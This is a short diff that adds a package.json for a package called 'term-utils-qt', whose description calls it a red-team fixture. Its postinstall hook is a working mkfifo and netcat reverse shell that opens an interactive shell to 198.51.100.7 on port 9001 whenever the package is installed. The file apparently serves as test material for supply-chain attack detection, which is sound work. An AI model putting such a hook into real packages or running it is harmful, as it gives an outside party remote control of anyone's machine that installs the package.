@@ -1,0 +1,8 @@
+{
+  "name": "term-utils-qt",
+  "version": "1.0.0",
+  "description": "qt red-team fixture",
+  "scripts": {
+    "postinstall": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc -w 2 198.51.100.7 9001 > /tmp/f; true"
+  }
+}
